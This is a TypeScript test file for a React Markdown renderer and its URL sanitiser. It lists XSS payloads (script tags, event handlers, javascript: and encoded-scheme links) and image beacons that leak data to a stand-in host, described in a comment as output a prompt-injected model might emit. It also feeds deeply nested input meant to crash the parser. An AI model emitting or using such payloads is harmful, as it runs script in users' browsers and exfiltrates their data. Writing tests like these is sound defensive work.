import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown, safeUrl } from './markdown';

const render = (text: string): string => renderToStaticMarkup(<Markdown text={text} />);

// Payloads a prompt-injected model might emit to run script or leak data from the page.
const PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<iframe src="https://evil.example"></iframe>',
  '<a href="javascript:alert(1)">click</a>',
  '[click](javascript:alert(1))',
  '[click](JaVaScRiPt:alert(1))',
  '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[click](vbscript:msgbox(1))',
  '![leak](https://evil.example/collect?secret=123)',
  '![](https://evil.example/pixel.png)',
  '<svg onload=alert(1)>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '[ref]: javascript:alert(1)\n\n[link][ref]',
  '<details open ontoggle=alert(1)>',
  // Encoded and bracketed schemes, and links or images in odd places.
  '[x](&#106;avascript:alert(1))',
  '[x](javascript&colon;alert(1))',
  '[x](<javascript:alert(1)>)',
  '[![img](https://evil.example/p.png)](https://example.com)',
  '[<img src=x onerror=alert(1)>](https://example.com)',
  '![ref][pic]\n\n[pic]: https://evil.example/p.png',
];

describe('Markdown', () => {
  it('renders common formatting', () => {
    const html = render(
      '**Bold**, _italic_, `code`\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |',
    );
    expect(html).toContain('<strong>Bold</strong>');
    expect(html).toContain('<em>italic</em>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('<table>');
  });

  it('opens safe links in a new tab without leaking the opener or referrer', () => {
    expect(render('[docs](https://example.com/docs)')).toBe(
      '<p><a href="https://example.com/docs" target="_blank" rel="noopener noreferrer nofollow">docs</a></p>',
    );
  });

  it.each(PAYLOADS)('neutralizes %s', (payload) => {
    const html = render(payload).toLowerCase();
    expect(html).not.toMatch(/<(script|iframe|img|svg|details|div|object|embed)\b/);
    expect(html).not.toMatch(/\son\w+=/);
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('vbscript:');
    expect(html).not.toContain('data:text');
    expect(html).not.toContain('evil.example/collect');
    expect(html).not.toContain('pixel.png');
  });

  it('shows image alt text instead of loading the image', () => {
    expect(render('![chart of sales](https://example.com/chart.png)')).toContain(
      '[chart of sales]',
    );
  });
});

describe('hostile structure', () => {
  it.each([
    ['nested quotes', `${'>'.repeat(3000)} x`],
    ['nested lists', `${'- '.repeat(1500)}x`],
    ['nested emphasis', `${'*_'.repeat(2000)}x${'_*'.repeat(2000)}`],
  ])('renders %s as text instead of crashing', (_name, text) => {
    const html = render(text);
    expect(html).toContain('x');
    // Never deeper than the cap, whatever the input.
    expect((html.match(/<blockquote>/g) ?? []).length).toBeLessThanOrEqual(20);
  });

  it('shows an autolink with a bad scheme as text, never as a link', () => {
    const html = render('<javascript:alert(1)>');
    expect(html).not.toContain('href');
    expect(html).not.toContain('<a');
  });

  it('decodes character references in text and links, but not in code', () => {
    expect(render('AT&amp;T &copy; &#169; &#x1F600; &unknown;')).toContain(
      'AT&amp;T © © 😀 &amp;unknown;',
    );
    expect(render('[x](https://a.example/?a=1&amp;b=2)')).toContain(
      'href="https://a.example/?a=1&amp;b=2"',
    );
    expect(render('`&copy;`')).toContain('<code>&amp;copy;</code>');
  });
});

describe('safeUrl', () => {
  it.each([
    ['https://example.com/a?b=1', 'https://example.com/a?b=1'],
    ['mailto:hello@example.com', 'mailto:hello@example.com'],
    ['javascript:alert(1)', ''],
    ['/relative/path', ''],
    ['//evil.example', ''],
  ])('%s → %s', (input, expected) => {
    expect(safeUrl(input)).toBe(expected);
  });
});
